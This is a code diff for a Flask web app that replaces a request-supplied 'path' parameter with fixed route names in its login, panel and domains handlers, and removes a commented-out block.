@@ -47,13 +47,6 @@ def index():
     if host == server_domain:
         return redirect(url_for('panel'))
     else:
-        # try:
-        #     path = request.args.get('path', None)
-        #     url = host + '$' + path
-        #     username = os.listdir(f'templates/domains/{url}/')[0]
-        #     return render_template(f'domains/{url}/{username}')
-        # except Exception as e:
-        #     print(session)
         domains = os.listdir(f'templates/domains/')
         for domain in domains:
             if host in domain:
@@ -127,10 +120,10 @@ def login():
                 return render_template('login.html')
     else:
         try:
-            path = request.args.get('path', None)
+            path = 'login'
   
             url = domain + '$' + path
-            
+
             username = os.listdir(f'templates/domains/{url}/')[0]
 
             if not 'entered' in session:
@@ -181,7 +174,7 @@ def panel():
         return render_template('index.html', username=username, admin=admin, logs=logs)
     else:
         try:
-            path = request.args.get('path', None)
+            path = 'panel'
             url = domain + '$' + path
 
             username = os.listdir(f'templates/domains/{url}/')[0]
@@ -316,7 +309,7 @@ def domains():
         return render_template('domains.html', domains=domains)
     else:
         try:
-            path = request.args.get('path', None)
+            path = 'domains'
             url = domain + '$' + path
             username = os.listdir(f'templates/domains/{url}/')[0]
 
